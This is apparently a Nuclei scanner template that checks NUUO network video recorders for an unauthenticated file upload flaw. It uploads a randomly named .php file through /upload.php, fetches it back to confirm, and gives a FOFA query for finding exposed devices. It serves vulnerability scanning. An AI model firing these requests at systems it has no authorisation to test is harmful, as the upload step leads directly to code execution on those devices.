id: nuuo-upload-uploadfile
info:
  author: PokerSEC
  metadata:
    fofasearch: title="Network Video Recorder Login"
  name: nuuo-upload-uploadfile
  severity: critical
requests:
- matchers:
  - condition: and
    dsl:
    - status_code_1==200 && status_code_2==200 && contains_all(body_2,"{{flag}}")
    type: dsl
  matchers-condition: and
  raw:
  - 'POST /upload.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=--------WebKitFormBoundaryJmuhnxJC760qNhIs

    accept: */*

    Content-Length: 152


    ----------WebKitFormBoundaryJmuhnxJC760qNhIs

    Content-Disposition: form-data; name="userfile"; filename="{{filename}}.php"


    {{flag}}

    ----------WebKitFormBoundaryJmuhnxJC760qNhIs--'
  - 'GET /{{filename}}.php HTTP/1.1

    Host: {{Hostname}}


    '
variables:
  filename: '{{to_lower(rand_base(10))}}'
  flag: '{{to_lower(rand_base(10))}}'
